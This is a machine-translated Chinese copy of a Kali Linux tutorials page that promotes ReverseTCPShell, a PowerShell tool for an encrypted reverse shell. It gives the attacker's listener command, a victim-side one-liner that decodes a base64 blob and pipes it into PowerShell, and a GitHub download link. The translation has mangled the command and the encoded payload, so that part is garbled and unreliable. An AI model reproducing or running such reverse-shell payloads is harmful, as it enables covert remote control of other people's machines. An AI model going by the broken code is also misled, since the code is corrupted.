# ReverseTCPShell:PowerShell ReverseTCP Shell，客户端和服务器

> 原文：<https://kalilinuxtutorials.com/reversetcpshell/>

[![ReverseTCPShell : PowerShell ReverseTCP Shell, Client & Server](img/5ad621d911a1112f5444f10e3d752c8b.png "ReverseTCPShell : PowerShell ReverseTCP Shell, Client & Server")](https://1.bp.blogspot.com/-KKIFRv6qFWI/XPopvYDgG6I/AAAAAAAAAsM/WjEQQK7JCaUYYHZFMvNMPzYJryP691VGgCLcBGAs/s1600/Payload%2BExecution.png)

**ReverseTCPShell** 是一个使用 PowerShell SecureString 在 TCP 上进行反向加密(AES 256 位)Shell 的工具。

*   **攻击者(C2 服务器监听器):**

PS >。\ReverseTCP.ps1

*   **目标(客户端):**

**cmd>echo iex([字符串]([文本]。编码::Unicode。getstring([转换]::frombase 64 string((jabbacccwbladyanaa 9 acaoabwabkamakwbbae 0 aygaciaasbaagaxaazgayagayagakadqbkgekhyakahualwb 4 afgargbfahuygb 0 ahqabhahyawawaagawa BWA 9 acaowasazqb5ad 0 akbbibambwahyachyazbyqax QA 6 adoargbyag 8 abqbagewbladyanabaqacgbpg 4 azwaac 退出| powershell–**

**也读作-[Metabigor:没有任何 API 键的命令行搜索引擎](https://kalilinuxtutorials.com/metabigor-search-engines-api-key/)**

### 概念验证:

*   有效负载执行:

![](img/3d813459deaaa895a9578cca71ff7aaa.png)

*   分析加密流量:

![](img/f22fd5e4033d061275fdc4dc6f5754fc.png)[**Download**](https://github.com/ZHacker13/ReverseTCPShell)